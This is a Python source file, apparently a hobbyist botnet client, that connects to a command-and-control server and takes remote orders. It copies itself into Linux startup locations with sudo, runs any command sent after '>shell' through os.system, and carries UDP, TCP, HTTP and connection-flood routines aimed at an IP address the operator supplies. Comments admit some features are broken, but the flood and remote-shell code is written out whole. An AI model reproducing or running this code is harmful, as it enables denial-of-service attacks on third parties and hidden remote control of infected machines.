# This was programmed by Feitan alone. All suggestions are welcome, (A part from the ones that ask for functions from RATs)
# Reminder - Startup is broken need to test on x7041 server
# Reminder - Auto reconnect does not work need testing on x7041 server
# Reminder - >Shell wont work on linux for some reason
import os
import sys
import time
import socket
import random
import threading
from json import load

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host = "localhost" # IP for the bot to connect to
port = 8000 # Port for the bot to connect to

connected = False

attk = True
active = 0

userAgents = []

userAgents.append("Linux / Firefox 29: Mozilla/5.0 (X11; Linux x86_64; rv:29.0) Gecko/20100101 Firefox/29.0")
userAgents.append("Linux / Chrome 34: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36")
userAgents.append("Mac / Firefox 29: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:29.0) Gecko/20100101 Firefox/29.0")
userAgents.append("Mac / Chrome 34: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36")
userAgents.append("Mac / Safari 7: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14")
userAgents.append("Windows / Firefox 29: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0")
userAgents.append("Windows / Chrome 34: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36")
userAgents.append("Windows / IE 6: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)")
userAgents.append("Windows / IE 7: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)")
userAgents.append("Windows / IE 8: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)")
userAgents.append("Windows / IE 9: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)")
userAgents.append("Windows / IE 10: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)")
userAgents.append("Windows / IE 11: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
userAgents.append("Android / Firefox 29: Mozilla/5.0 (Android; Mobile; rv:29.0) Gecko/29.0 Firefox/29.0")
userAgents.append("Android / Chrome 34: Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36")
userAgents.append("iOS / Chrome 34: Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) CriOS/34.0.1847.18 Mobile/11B554a Safari/9537.53")
userAgents.append("iOS / Safari 7: Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53")

header = [
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
"Accept-Language: en-us,en;q=0.5",
"Accept-Encoding: gzip,deflate",
"Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7",
"Keep-Alive: 115",
"Connection: Keep-Alive"
]

headers = " \n".join(header)

try:
	fileName = sys.argv[0]
	if os.name == "nt":
		os.system("")
	else:
		os.system("sudo mv %s /etc/systemd/system" % fileName)
		os.system("sudo mv %s /etc/rc.local" % fileName)
		os.system("sudo mv %s /etc/init.d" % fileName)
except:
	pass

while not connected:
	try:
		sock.connect((host, port))
		#ip = load(urlopen('http://jsonip.com'))['ip']
		ip = "localhost"
		sock.send(ip)
		connected = True
	except:
		pass

while connected is True:
	try:
		def commands():
			global attk
			global active
			global connected

			msg = sock.recv(512)
			sock.send(bytes("Data"))

			if msg.lower().startswith(">dup"):
				try:
					connected = False
				except:
					pass

			if msg.lower().startswith(">shell"):
				try:
					shell = msg[7:]
					os.system(shell)
				except:
					pass

			if msg.lower().startswith(">udp"):
				def udpflood():
					global attk
					global active
					try:
						def udpflooder():
							try:
								udpflood = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 17)
								port = random.randint(1, 65535)
								udpflood.sendto(package, (ip, port))
							except:
								pass

						ip = msg.split(" ")[1]
						psize = int(msg.split(" ")[2])
						timer = int(float(msg.split(" ")[3]))

						timeout = time.time() + 1 * timer

						package = random._urandom(psize)

						print("Command Accepted!")
						print("UDP: Sent to %s with %s packets of data for %s seconds!" % (ip, psize, timer))
						active += 1

						while True:
							thread = threading.Thread(target=udpflooder)
							thread.Deamon = True
							thread.start()
							thread.join()
							if time.time() > timeout:
								active -= 1
								return
							if attk == False:
								active -= 1
								print("UDP: Attack Killed!")
								return
					except:
						pass
				udpflood()

			if msg.lower().startswith(">tcp"):
				def tcpflood():
					global attk
					global active
					try:
						def tcpflooder():
							try:
								tcpflood = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
								tcpflood.connect((ip, 80))
								port = random.randint(1, 65535)
								tcpflood.sendto(package, (ip, port))
								tcpflood.close()
							except:
								pass

						ip = msg.split(" ")[1]
						psize = int(msg.split(" ")[2])
						timer = int(float(msg.split(" ")[3]))

						timeout = time.time() + 1 * timer

						package = random._urandom(psize)

						print("Command Accepted!")
						print("TCP: Sent to %s with %s packets of data for %s seconds!" % (ip, psize, timer))
						active += 1

						while True:
							thread = threading.Thread(target=tcpflooder)
							thread.Deamon = True
							thread.start()
							thread.join()
							if time.time() > timeout:
								active -= 1
								return
							if attk == False:
								active -= 1
								print("TCP: Attack Killed!")
								return
					except:
						pass
				tcpflood()

			if msg.lower().startswith(">http"):
				def httpflood():
					global attk
					global active
					try:
						def httpflooder():
							try:
								sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
								resolvedHost = socket.gethostbyname(ip)

								query = str("GET / HTTP/1.1\nHost: "+resolvedHost+"\n\nUser-Agent: "+random.choice(userAgents)+"\n"+headers).encode("utf-8")
								sock.connect((resolvedHost, 80))
								sock.sendall(query)
								sock.close()
							except:
								pass

						ip = msg.split(" ")[1]
						threads = int(msg.split(" ")[2])
						timer = int(float(msg.split(" ")[3]))

						timeout = time.time() + 1 * timer

						print("Command Accepted!")
						print("HTTP: Sent to %s with %s threads for %s seconds!" % (ip, threads, timer))
						active += 1

						while True:
							for x in range(threads):
								thread = threading.Thread(target=httpflooder)
								thread.Deamon = True
								thread.start()
								thread.join()
								if time.time() > timeout:
									active -= 1
									return
								if attk == False:
									active -= 1
									print("HTTP: Attack Killed!")
									return
					except:
						pass
				httpflood()

			if msg.lower().startswith(">cnc"):
				def cncflood():
					global attk
					global active
					try:
						def cncflooder():
							try:
								cnc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
								cnc.connect((ip, port))
								cnc.close()
							except:
								pass

						ip = msg.split(" ")[1]
						port = int(msg.split(" ")[2])
						amount = int(msg.split(" ")[3])

						print("Command Accepted!")
						print("CNC: Sent to %s on port %s %s times!" % (ip, port, amount))
						active += 1

						for x in range(amount):
							thread = threading.Thread(target=cncflooder)
							thread.Deamon = True
							thread.start()
							thread.join()
							if attk == False:
								active -= 1
								print("CNC: Attack Killed!")
								return
						active -= 1
					except:
						pass
				cncflood()

			if msg.lower().startswith(">killattk"):
				try:
					attk = False
				except:
					pass

			if active == 0:
				try:
					attk = True
				except:
					pass
		commands()

		for i in range(100):
			thread = threading.Thread(target=commands, args=(""), name='Command Handler')
			thread.setDaemon(True)
			thread.start()

	except socket.error:
		connected = False
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		while not connected:
			try:
				sock.connect((host, port))
				#ip = load(urlopen('http://jsonip.com'))['ip']
				ip = "localhost"
				sock.send(ip)
				connected = True
			except socket.error:
				pass
sock.close()
